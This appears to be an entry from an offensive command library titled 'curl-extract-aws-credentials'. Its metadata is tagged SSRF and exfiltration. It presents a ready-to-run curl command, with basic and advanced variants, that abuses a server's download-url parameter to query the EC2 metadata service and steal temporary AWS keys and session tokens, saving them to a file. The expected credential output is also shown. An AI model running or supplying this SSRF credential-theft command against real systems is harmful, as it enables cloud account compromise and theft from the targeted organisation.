---
data: >-
  curl
  "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
tags:
  - ssrf
  - exfiltration
  - aws
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 8e64fe16-cfd0-4649-9a32-ea0aa7a8ff86
created_at: '2025-12-14T03:46:09.156Z'
updated_at: '2025-12-14T03:46:09.156Z'
verified: false
validated: true
submitted: true
---
# curl-extract-aws-credentials

## Command

```bash
curl "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
```

## Description

This command uses SSRF to extract temporary AWS credentials from the IMDS, including keys and token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-` | URL query injection | Yes |
| `url=...` | Specific credentials path | Yes |

## Examples

### Basic Usage

```bash
curl "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
```

### Advanced Usage

```bash
curl -s "https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance" > creds.json
```

## Expected Output

JSON: {"AccessKeyId":"ASIA...","SecretAccessKey":"wJal...","Token":"IQo...","Expiration":"2023-..."}

## Related

- [[Related Procedure]]
